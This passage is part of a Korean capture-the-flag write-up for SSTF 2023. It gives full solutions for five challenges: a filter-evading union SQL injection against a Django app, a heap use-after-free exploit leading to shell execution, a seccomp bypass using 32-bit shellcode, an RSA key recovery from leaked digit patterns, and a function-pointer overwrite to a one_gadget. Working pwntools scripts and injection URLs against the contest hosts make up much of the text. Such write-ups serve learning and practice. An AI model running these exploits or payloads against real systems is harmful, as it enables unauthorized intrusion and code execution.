[http://libreriapro37657fd3.sstf.site/?key='&search_with=year&currency=krw](http://libreriapro37657fd3.sstf.site/?key=%27&search_with=year&currency=krw)

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%207.png)

다음과 같이 오류가 뜨는 것을 알 수 있습니다. 오류를 세세히 확인해보다 Local vars에 `SQL_FILTER`가 적혀있는 `/root/libreria/impl/views.py` 경로의 traceback을 발견했습니다.

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%208.png)

```python
sqli_filters = [';', '/', '\\', '*', '=', '#', '&', '%', '<', '>', '^', '|', '$', '0X', '+', '~', '!', '@', 'TRUE', 'FALSE', 'OR', 'JOIN', 'DIV', 'LIKE', 'REGEXP', 'ST', 'CONVERT', 'IS', 'NOT', 'MATCH', 'BINARY', 'BETWEEN', 'ISNULL', 'ALIAS', 'ROUND', 'POW', 'LOAD', 'VERSION', 'LIMIT', 'OFFSET', 'ALL', 'ANY', 'EXISTS', 'SOME', 'IN']
```

또한, 40번째 줄을 누르면 앞뒤로 조금씩 code leak이 가능합니다.

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%209.png)

```python
  elif search_with == "title":
		search_res = Books.objects.filter(title__icontains=key)
	elif search_with == "author":
		search_res = Books.objects.filter(author__icontains=key)
	elif search_with == "publisher":
		search_res = Books.objects.filter(author__icontains=key)
	elif "year" in search_with or "month" in search_with:
		search_res = Books.objects.annotate(target=Extract('pubdate', search_with)).filter(target=key) …
	elif search_with:
		books['res'] = "error"
	if search_res:
		books = {"books": [book for book in search_res if Books.isValidISBN(book.isbn)][:max_entries]}
```

leak한 코드를 보면 search_with에 `year` 혹은 `month` 라는 단어가 들어갔을 때 Extract 부분에 search_with가 직접 들어가는 것을 확인할 수 있습니다.

key에 유효한 년도를 넣고, search_with에 `year'` 를 넣어 어떤 쿼리로 동작하는지 확인했습니다.

[http://libreriapro37657fd3.sstf.site/?key=2016&search_with=year'&currency=krw](http://libreriapro37657fd3.sstf.site/?key=2016&search_with=year%27&currency=krw)

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%2010.png)

마지막 traceback을 보면 어떤 sql query를 실행했는지 알 수 있습니다. 

```python
SELECT "impl_books"."id", "impl_books"."title", "impl_books"."image","impl_books"."author", "impl_books"."price", "impl_books"."publisher","impl_books"."pubdate","impl_books"."isbn", "impl_books"."description",EXTRACT('year'' FROM "impl_books"."pubdate" AT TIME ZONE 'Asia/Tokyo') AS "target" FROM "impl_books" WHERE EXTRACT('year'' FROM "impl_books"."pubdate" AT TIME ZONE 'Asia/Tokyo') = %s(2016)
```

추출하는 칼럼의 총 갯수는 id, title, image, author, price, publisher, pubdate, isbn, description, pubdate의 year 해서 총 10개이며, 두 부분에 입력한 `year'` 가 들어가는 것을 알 수 있습니다.

이전에 뽑아놓은 sqli_filters를 유의하여 SQL injection을 진행하면 됩니다.

search_with 자리에 time zone을 제외한 `year' from "impl_books"."pubdate") AS "target" FROM "impl_books"-- -` 를 넣어주었습니다. (time zone이 필터링되는 `/` 를 가지고 있기 때문에…)

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%2011.png)

제대로 전부 뽑히는 것을 볼 수 있습니다.
그럼 이번엔 information_schema에서 원하는 내용을 추출해보았습니다.

Extract를 사용할 때 timestamp를 사용해야되기 때문에 `::timestamp` 를 통해 형 변환을 했습니다.

`http://libreriapro37657fd3.sstf.site/?key=2016&search_with=year' from "impl_books"."pubdate") AS "target" FROM "impl_books" WHERE false UNION SELECT '1',table_name,table_schema,table_schema,'5','6','2021-02-03 15:23:22.23242'::timestamp,'9781329837294','9','10' AS "target" from information_schema.tables where table_schema like 'books'-- -&currency=krw`

해당 payload를 만들 때, isbn 자리에 `9781329837294` 를 주었던 이유는 isValidISBN 함수를 통해 유효한 isbn일 경우에만 각각의 row를 books에 넣어주기 때문입니다.

```python
if search_res:
		books = {"books": [book for book in search_res if Books.isValidISBN(book.isbn)][:max_entries]}
```

또한, max_entries에 의해 100개씩 끊기기 때문에 필터링을 자세히 걸어주어야 합니다. (db명 등)

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%2012.png)

 `impl_t0p5ecr3t` 테이블이 수상하다고 생각해 column을 뽑아보았습니다.

`http://libreriapro37657fd3.sstf.site/?key=2016&search_with=year' from "impl_books"."pubdate") AS "target" FROM "impl_books" WHERE false UNION SELECT '1',column_name,'3','4','5','6','2021-02-03 15:23:22.23242'::timestamp,'9781329837294','9','10' AS "target" from information_schema.columns where table_name like 'impl_t0p5ecr3t'-- -&currency=krw`

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%2013.png)

id, key, value가 나왔고, 이전 문제에서 value에 플래그가 있어 먼저 value를 확인해보았습니다.

`http://libreriapro37657fd3.sstf.site/?key=2016&search_with=year' from "impl_books"."pubdate") AS "target" FROM "impl_books" WHERE false UNION SELECT '1','2','3',value,'5','6','2021-02-03 15:23:22.23242'::timestamp,'9781329837294','9','10' AS "target" from impl_t0p5ecr3t-- -&currency=krw`

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%2014.png)

**FLAG :** `SCTF{L3ts_k3Ep_th3_veRs10n_0f_the_fr4mEwOrk_up_to_d4te}` 

## Heapster

대표적인 취약점은 3가지가 있습니다.

1. `alloc`과 `free`상태를 마킹해 구분하나, `print`시 구분 없이 출력해준다
    1. 해당 취약점을 이용해 `safe linking`된 `heap`의 주소를 알 수 있다
2. `alloc` → `free` → `alloc`을 하게 되면, 2번째 `alloc`에서 `UAF`가 발생한다.
    1. `1.a`에서 알아낸 `heap`주소를 이용하여 `PROTECT_PTR` 을 우회해 임의 주소를 할당할 수 있다
3. `verify`과정에서 `stack`에 복사한 내용을 청크의 내용과 비교하는데, `arr[i*8+j]`가 `stack`의 범위를 넘어간다. 따라서 `stack`상에 있는 임의의 값을 얻을 수 있다.

따라서 익스 과정은 아래와 같습니다.

1. `verify`과정을 이용해 `libc`주소를 얻는다
2. `alloc(i)`→`alloc(i+1)`→`free(i)`→`free(i+1)`→`print()`로 `heap` 주소를 얻는다
3. UAF를 통해 임의 주소를 할당한다
    1. `alloc(i)`→`alloc(i+1)`→`free(i)`→`free(i+1)` → `alloc(i+1)`
    2. `alloc(i+1)`에 `PROTECT_PTR(base, <victim_ptr>)` 작성
    3. `alloc(i+2)` → `alloc(i+3)` 
    4. `alloc(i+3)` 은 `<victim_ptr>`위치에 할당됩니다.
4. `3`의 프리미티브를 사용하여 후술할 방식으로 원하는 코드를 실행할 수 있습니다

`exit`시 내부적으로 `__call_tls_dtors`을 호출하므로, `tls_dtor_list`위치와 `fs:[0x30]`에 청크를 할당받고 `cur->func=0x0, cur->obj=<binsh_addr>, fs:[0x30]=<system_address>`을 하면  `RCE`가 가능합니다.

```jsx
void
__call_tls_dtors (void)
{
  while (tls_dtor_list)
    {
      struct dtor_list *cur = tls_dtor_list;
      dtor_func func = cur->func;
#ifdef PTR_DEMANGLE
      PTR_DEMANGLE (func);
#endif

      tls_dtor_list = tls_dtor_list->next;
      func (cur->obj);
```

**Payload**는 아래와 같습니다

```jsx
from pwn import *

context.terminal = ['tmux', 'new-window']

def add(idx, data):
    p.sendlineafter("cmd: ", "1")
    p.sendline(str(idx))
    p.send(data.ljust(0x10, b"\x00"))

def delete(idx):
    p.sendlineafter("cmd: ", "2")
    p.sendline(str(idx))

def show():
    p.sendlineafter("cmd: ", "3")

def recover_safelink(safelink):
    protect = []
    recover = [0x0]
    for i in range(5):
        protect = [safelink&0xfff] + protect
        safelink >>= 12
    
    for i in range(0, 5):
        val = recover[i] ^ protect[i]
        recover += [val]

    heap_leak = 0
    for val in recover:
        heap_leak <<= 12
        heap_leak += val
    return heap_leak

def encrypt_ptr(base, ptr):
    return (base >> 12) ^ ptr
p = process("./chal")
p = remote("heapster.sstf.site", "31339")

# gdb.attach(p, """
# # b *(_dl_fini +488)
# b __GI___call_tls_dtors
# """)
libc = ELF("./libc.so.6")

# init_validate = "92eab7870b69dfb99c62db3ca075b222be8822a861bbfbbbc94f4b536682fe52"
# for i in range(0, len(init_validate), 0x8):
#     add(i, init_validate[i:i+0x10].encode())

libc_leak = b"\x90"
for i in range(0x4):
    for j in range(0x1, 0x100):
        add(0x15, libc_leak+j.to_bytes(1, "little"))
        p.sendlineafter("cmd: ", "4")
        if b"success" in p.recvline():
            libc_leak += j.to_bytes(1, "little")
            print(libc_leak)
            break
libc_leak += b"\x7f"
libc_base = u64(libc_leak.ljust(8, b"\x00")) - 0x29d90
print("libc_leak: ", hex(libc_base))

add(0x1e, b"A"*0x10)
add(0x1f, b"B"*0x10)
delete(0x1e)
delete(0x1f)
show()
p.recvuntil("->")
heap_leak = recover_safelink(u64(p.recvline()[:-1].ljust(8, b"\x00")))
print("heap_leak: ", hex(heap_leak))

add(0x1f, p64(encrypt_ptr(base=heap_leak, ptr=libc_base - 0x2920)))
add(0x1, p64(0x0) + b"/bin/sh\x00")
add(0x2, p64(0x0) + p64(libc_base + 0x21d000))# + p64(libc_base + 0xebcf5))

add(0x3, b"A"*0x10)
add(0x4, b"B"*0x10)
delete(0x3)
delete(0x4)
add(0x4, p64(encrypt_ptr(base=heap_leak, ptr=libc_base - 0x2890)))
add(0x5, p64(0x0)*2)
add(0x6, p64(libc_base + libc.symbols['system']))

add(0x7, b"A"*0x10)
add(0x8, b"B"*0x10)
delete(0x7)
delete(0x8)
add(0x8, p64(encrypt_ptr(base=heap_leak, ptr=libc_base + 0x21d000)))
add(0x9, p64(0x0)*2)
add(0xa, p64(0x0) +p64(libc_base + 0x1d8698))

p.sendlineafter("cmd: ", "0")
p.interactive()
```

**FLAG:** `SCTF{6470e394cbf6dab6a91682cc8585059b}`

## Escape

`seccomp_tools`를 통해 분석해 본 결과 `x86_64`를 검사하지 않음을 확인할 수 있습니다.

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%2015.png)

따라서, `x86`으로 `cs register`을 돌린 뒤 익스플로잇을 수행할 수 있고, 이를 위해 `retf`를 이용해야 합니다. `stack`과 `code`영역을 4bytes으로 바꾼 후 stack에 `cs`, `eip`를 넣은 뒤 `retf`하면 `x86`모드에서 `syscall`을 실행할 수 있습니다.

이후 `ORW` 를 통해 원하는 내용을 가져올 수 있습니다.

**Payload**는 다음과 같습니다.

```jsx
from pwn import *

context.terminal = ['tmux', 'new-window']
# context.log_level = 'debug'
context.arch = 'i386'

e = ELF('./escape')
l = e.libc
# p = process(e.path)
p = remote("escape.sstf.site", "5051")
# gdb.attach(p, """
# brva 0x164A
# """)
# p = remote(HOST, PORT)

def aaw8(addr, value):
    assert (0 <= value and value < 0x100)
    payload = b''
    if value != 0:
        payload += f"%{value}c".encode()
    payload += b"%10$hhn"
    payload = payload.ljust(0x10, b'\x00')
    payload += p64(addr)
    assert (len(payload) < 0x80)
    p.recvuntil(b"Enter: \n")
    p.sendline(payload)

map_addr = 0x50510000

shellcode = b"\xBC\x00\x08\x51\x50\x67\xC7\x44\x24\x04\x23\x00\x00\x00\x67\xC7\x04\x24\x20\x00\x51\x50\xCB".ljust(0x20, b"\x90")
shellcode += asm(shellcraft.i386.open("./flag"))
shellcode += asm(shellcraft.i386.read(5, "esp", 41))
shellcode += asm(shellcraft.i386.write(1, "esp", 41))

for i, c in enumerate(shellcode):
    aaw8(map_addr + i, c)

p.sendline("done")
p.interactive()
```

**FLAG:** `SCTF{4lm057_f0r607_4b0u7_7h1r7y_7w0_b175}`

## Crypto Machine

먼저 문제의 description 으로부터 문제 의도를 추측해봅시다. `The following memory access patterns were discovered:`이라는 말에서, `d_p_as_digits`은 `dp`를 16진수로 나타냈을 때, `dp`의 각 자리수를 어떤 (0,1,…,15)의 permutation으로 치환한 결과라고 추측해볼 수 있습니다. 하지만 이때 문제가 발생하는데, ?, 0, 1로 이루어진 dp 문자열을 4개씩 끊어서 같은 패턴끼리 묶어보면 비트 모순이 발생함을 확인할 수 있습니다. 아래의 코드를 봅시다.

```python
dp_bits_8 = ([dp_bits[i:i+4] for i in range(0, len(dp_bits), 4)])
dq_bits_8 = ([dq_bits[i:i+4] for i in range(0, len(dq_bits), 4)])

pdict = ["????" for _ in range(16)]
qdict = ["????" for _ in range(16)]

cnt = 0
for what, digit in zip(dp_bits_8, d_p_as_digits):
    tmp = ""
    for s1, s2 in zip(pdict[digit], what):
        if s1 == '?' and s2 == '?':
            tmp += '?'
        elif s1 != '?' and s2 != '?':
            cnt += 1
            if s1 != s2: # meaning that this cause contradiction
                print(what, pdict[digit], digit) # In this case, reached in here
            tmp += s1
        else:
            if s1 != '?':
                tmp += s1
            else:
                tmp += s2
    pdict[digit] = tmp
```

`if s1!=s2` 부분이 곧 비트의 모순이 발생한다는 뜻이고, 위 코드로 돌렸을 경우에는 실제로 모순이 발생했습니다. 하지만 저는 문제 의도가 아무리 생각해도 이것 같다고 생각했고, 이 추측에 강한 확신을 가지고 있었습니다. 이리저리 어디 부분이 문제인지 살펴보다, 공개된 힌트를 보고  `d_p_as_digits`을 reverse시켜서 접근해보면 되지 않을까라고 생각했고, 실제로 돌려본 결과 모순이 발생하지 않았습니다. 아래의 코드에서 이 과정을 확인할 수 있습니다.

```python
dp_bits_8 = reversed([dp_bits[i:i+4] for i in range(0, len(dp_bits), 4)])
dq_bits_8 = reversed([dq_bits[i:i+4] for i in range(0, len(dq_bits), 4)])

pdict = ["????" for _ in range(16)]
qdict = ["????" for _ in range(16)]

cnt = 0
for what, digit in zip(dp_bits_8, d_p_as_digits):
    tmp = ""
    for s1, s2 in zip(pdict[digit], what):
        if s1 == '?' and s2 == '?':
            tmp += '?'
        elif s1 != '?' and s2 != '?':
            cnt += 1
            if s1 != s2: # meaning that this cause contradiction
                print(what, pdict[digit], digit) # In this case, NOT reached in here
            tmp += s1
        else:
            if s1 != '?':
                tmp += s1
            else:
                tmp += s2
    pdict[digit] = tmp
```

cnt를 통해 모순이 발생할 수 있었던 곳이 dp와 dq 포함 19개임을 확인했었고, 약 1/2확률로 발생할 모순 19개를 모두 피해갔기에 현재 풀이가 매우 높은 확률로 옳다고 할 수 있습니다.

이제 어떤 permutation으로 이 숫자들이 재배열 되었는지 알아내면 dp를 복원할 수 있고, 플래그를 딸 수 있습니다. 어느정도 확정된 비트들이 많았기에 완전 탐색을 통해 가능한 permutation들의 수를 모두 저장하여, 이를 토대로 만든 dp가 유효한지, 즉 GCD(pow(2, dp, N) - 2, N)이 p가 되는지 검사하는 방식으로 탐색하였고, 최종적으로 p를 얻어 플래그를 복호화할 수 있었습니다. 전체 익스플로잇은 아래와 같습니다.

```python
d_q_as_digits=[13, 10, 13, 0, 0, 3, 6, 2, 6, 4, 15, 9, 15, 2, 10, 12, 15, 3, 4, 2, 2, 10, 10, 11, 3, 11, 9, 7, 14, 12, 5, 10, 6, 11, 8, 2, 2, 8, 3, 11, 0, 4, 6, 0, 0, 1, 11, 4, 9, 2, 8, 14, 12, 14, 15, 14, 12, 8, 9, 9, 9, 6, 5, 1, 2, 12, 10, 6, 7, 2, 6, 12, 13, 13, 2, 12, 15, 15, 8, 12, 0, 15, 14, 4, 14, 8, 6, 15, 13, 12, 5, 2, 12, 10, 12, 10, 9, 7, 10, 4, 3, 0, 0, 6, 0, 7, 10, 6, 7, 5, 5, 15, 8, 12, 11, 14, 0, 2, 11, 5, 7, 4, 10, 3, 8, 5, 5, 14, 3, 12, 1, 6, 6, 8, 0, 0, 1, 9, 8, 14, 15, 12, 10, 8, 3, 2, 14, 5, 6, 1, 3, 8, 5, 13, 3, 1, 14, 6, 9, 1, 11, 0, 7, 12, 12, 11, 14, 0, 14, 15, 9, 6, 10, 7, 9, 10, 5, 12, 12, 3, 10, 11, 7, 9, 13, 10, 1, 11, 11, 4, 13, 10, 13, 14, 13, 6, 1, 3, 6, 12, 3, 5, 5, 2, 2, 7, 12, 11, 2, 3, 9, 8, 14, 0, 5, 7, 12, 10, 14, 8, 3, 10, 2, 6, 4, 12, 9, 7, 2, 4, 4, 15, 0, 4, 11, 14, 5, 7, 4, 0, 4, 9, 11, 13]
d_p_as_digits=[0, 13, 5, 1, 1, 11, 11, 3, 6, 15, 13, 11, 8, 15, 10, 8, 2, 7, 2, 4, 11, 1, 15, 1, 15, 5, 10, 11, 3, 2, 13, 7, 2, 15, 1, 6, 12, 9, 11, 11, 15, 10, 4, 11, 8, 4, 11, 13, 7, 3, 15, 0, 10, 3, 3, 13, 14, 0, 5, 14, 0, 4, 5, 10, 1, 7, 9, 12, 4, 14, 12, 11, 6, 10, 9, 10, 10, 15, 13, 0, 7, 5, 8, 4, 2, 4, 2, 4, 9, 13, 12, 2, 8, 7, 0, 9, 7, 15, 9, 12, 12, 11, 3, 13, 13, 5, 6, 0, 8, 1, 1, 13, 11, 10, 15, 3, 13, 6, 7, 3, 7, 0, 8, 11, 5, 15, 1, 12, 7, 13, 2, 6, 9, 15, 3, 14, 1, 5, 6, 1, 8, 6, 5, 15, 13, 9, 13, 1, 4, 7, 9, 7, 5, 6, 8, 14, 15, 2, 1, 15, 0, 14, 9, 7, 9, 1, 12, 6, 10, 1, 5, 8, 14, 3, 15, 13, 13, 15, 5, 6, 9, 0, 0, 3, 1, 6, 10, 6, 2, 4, 1, 4, 11, 7, 8, 3, 6, 9, 1, 15, 4, 14, 12, 15, 15, 10, 6, 6, 2, 1, 14, 15, 12, 1, 6, 9, 11, 7, 5, 11, 2, 2, 7, 8, 6, 5, 13, 10, 13, 15, 8, 3, 5, 11, 14, 14, 1, 2, 15, 2, 13, 5, 6, 15]
dp_bits = "???0??????????????????????????????1???1??????????????????????????????0???1??????????????????????????????1???0??????????????????????????????0???0??????????????????????????????0???1??????????????????????????????0???0??????????????????????????????1???1??????????????????????????????0???1??????????????????????????????0???1??????????????????????????????1???1??????????????????????????????1???0??????????????????????????????0??????????????????????????????????1??????????????????????????????????0??????????????????????????????????0??????????????????????????????????0??????????????????????????????????1??????????????????????????????????1??????????????????????????????????0??????????????????????????????????1??????????????????????????????????1??????????????????????????????????0??????????????????????????????????1??????????????????????????????????0??????????????????????????????????0??????????????????????????????????1??????????????????????????????????0??????????????????????????????1"
dq_bits = "?????????????1??????????????????????????????1?????????????0??????????????????????????????0?????????????1??????????????????????????????1?????????????0??????????????????????????????0?????????????0??????????????????????????????1?????????????0??????????????????????????????0?????????????0??????????????????????????????0?????????????1??????????????????????????????0?????????????0??????????????????????????????1?????????????1??????????????????????????????0?????????????0??????????????????????????????1?????????????1??????????????????????????????1?????????????1??????????????????????????????0?????????????0??????????????????????????????0?????????????1??????????????????????????????0?????????????0??????????????????????????????0?????????????1??????????????????????????????0?????????????1??????????????????????????????1????????????????????????????????????????????0????????????????????????????????????????????0????????????????????????????????????????????0??????????????????????????????1"
n=247986593396209875084012131452934099056733647935670515473445992426598899768930823740730826984242067958254605065641483735657759815550540477139432139634638820800423008986789544454729772610227969667760774290284773564029419009020038717859540703507091627999301056310286835600515951248243765130446092120746666876180555284845580231826491442541887612771483752883992273123591778121336015719453085571539280921597192879792417258434207273636582639024556173720065931114200134382018852051071187029307957847828986113074903235247989408426632701126391774984490145343174906256844624326505324922216905289293
flag_enc = 156539305485572699191103505011941122379332151701553059603110690165418795969653170470280711364827383168784090115293778700305550080169460850699540494174149060011762008936085442871933384008015397771403854069510064266983329620117434277066221978735255338346311441103219209899777467779541064732463934404772189243868464339796846862363442127703578646463227851657485689792622948429216331294552860614314283266751264721228761442121952040022067542021305711961849418456816471091404036663730796501797813320194656309206085482726560893004214523505587683373830593170341654010162468594209116725534777579419

dp_bits_8 = reversed([dp_bits[i:i+4] for i in range(0, len(dp_bits), 4)])
dq_bits_8 = reversed([dq_bits[i:i+4] for i in range(0, len(dq_bits), 4)])

pdict = ["????" for _ in range(16)]
qdict = ["????" for _ in range(16)]

cnt = 0
for what, digit in zip(dp_bits_8, d_p_as_digits):
    tmp = ""
    for s1, s2 in zip(pdict[digit], what):
        if s1 == '?' and s2 == '?':
            tmp += '?'
        elif s1 != '?' and s2 != '?':
            cnt += 1
            if s1 != s2:
                print(what, pdict[digit], digit) # Not get in here, hopefully
            tmp += s1
        else:
            if s1 != '?':
                tmp += s1
            else:
                tmp += s2
    pdict[digit] = tmp
print(cnt)
cnt = 0

for what, digit in zip(dq_bits_8, d_q_as_digits):
    tmp = ""
    for s1, s2 in zip(qdict[digit], what):
        if s1 == '?' and s2 == '?':
            tmp += '?'
        elif s1 != '?' and s2 != '?':
            cnt += 1
            if s1 != s2:
                print(what, qdict[digit], digit)
            tmp += s1
        else:
            if s1 != '?':
                tmp += s1
            else:
                tmp += s2
    qdict[digit] = tmp
print(cnt)

qdict[2] = '0010'
for i in range(16):
    print(qdict[i], end = ' ')

print()

q_able = [[] for _ in range(16)]
for i in range(16):
    for j in range(16):
        j1 = bin(j)[2:].zfill(4)
        yes = 1
        for t in range(4):
            if qdict[i][t] == '?' or qdict[i][t] == j1[t]:
                None
            else:
                yes = 0
        if yes:
            q_able[i].append(j)

current = []
ans = []
def search(depth):
    if depth >= 16:
        ans.append(current.copy())
        return
    for i in q_able[depth]:
        if i in current:
            continue
        current.append(i)
        search(depth + 1)
        current.pop()

search(0)

"""
from tqdm import tqdm
for q1 in tqdm(ans):
    dq = 0
    for i in reversed(d_q_as_digits):
        dq *= 16
        dq += q1[i]
    from Crypto.Util.number import *
    q = GCD(pow(2, 0x10001*dq, n) - 2, n)
    if q != 1:
        print(q)
        print(q1)
"""

# got q!

q = 595347331182237061347692817052681611773957447581678972755021305396135991672166078878425800756900446693751359592663038457826236214317841578620119321597623505354261297234533414377268097416007957411658784462114462457802873838204636148813681556004050482640036934572347409577272590176272426287400991
p = n // q

phi = n - p - q + 1
from Crypto.Util.number import *
d = inverse(0x10001, phi)

flag = pow(flag_enc, d, n)
print(long_to_bytes(flag))
print(long_to_bytes(flag)[::-1])
```

`SCTF{1232-32452-4564-2432}`

## 2-outs-in-the-ninth-inning

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char v3; // bl
  char *v4; // r12
  void *handle; // [rsp+0h] [rbp-40h]
  char v6[8]; // [rsp+8h] [rbp-38h] BYREF
  int (**v7)(const char *, ...); // [rsp+10h] [rbp-30h]
  unsigned int v8; // [rsp+18h] [rbp-28h]
  unsigned int v9; // [rsp+1Ch] [rbp-24h]
  unsigned __int64 v10; // [rsp+28h] [rbp-18h]

  v10 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  alarm(0xAu);
  v7 = &printf;
  v8 = 0;
  v9 = 0;
  handle = dlopen("libc.so.6", 2);
  puts("You have only 3 chances to win the game.");
  puts("\nThe 1st chacne: Get libc symbol info.");
  showFuncAddr(handle);
  puts("\nThe 2nd chacne: Get libc symbol info.");
  showFuncAddr(handle);
  puts("\nTwo strikes against you. Now that you have only ONE chance.");
  printf("Can you guess the pitcher's selection?\n > ");
  fgets(v6, 16, stdin);
  v3 = v6[0];
  v4 = pitches;
  if ( v3 == v4[rand() % 26] )
    ((void (__fastcall *)(const char *))v7)(" You hit the ball! It's an amazing walk-off homerun. Your team won the game.\n");
  else
    ((void (*)(const char *, ...))v7)(" Struck out. Game Over - You got %d hits and %d runs.\n", v8, v9);
  dlclose(handle);
  exit(0);
}
```

코드를 보면 libc에서 원하는 심볼에 해당하는 주소 두 개를 얻을 수 있고, fgets에서 bof로 함수 포인터를 덮을 수 있습니다. 따라서 원하는 함수를 호출할 수 있지만 인자 설정이 불가능합니다. 그러나 else 문에 있는 코드를 보면, 함수 호출시 2번째 인자와 3번째 인자에 0을 전달하고 있으므로 조건을 만족하는 one_gadget이 존재할 확률이 높습니다. libc는 database에서 구해오고 조건에 맞는 one_gadget을 찾아서 문제를 해결했습니다. 

```python
from pwn import *

#r = process("./9end2outs")
r = remote("2outs.sstf.site", 1337)

r.sendlineafter("> ", "system")
r.recvuntil("is at ")
system = int(r.recvn(14), 16)
libc_base = system - 0x50d60
one_gadget = libc_base + 0xebcf8
log.info(hex(libc_base))

r.sendlineafter("> ", "system")

r.sendlineafter("> ", p64(one_gadget)*2)

r.interactive()
```

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%2016.png)

`SCTF{c0ngr47s_y0u_R_Th3_MVP_0f_th15_94m3}`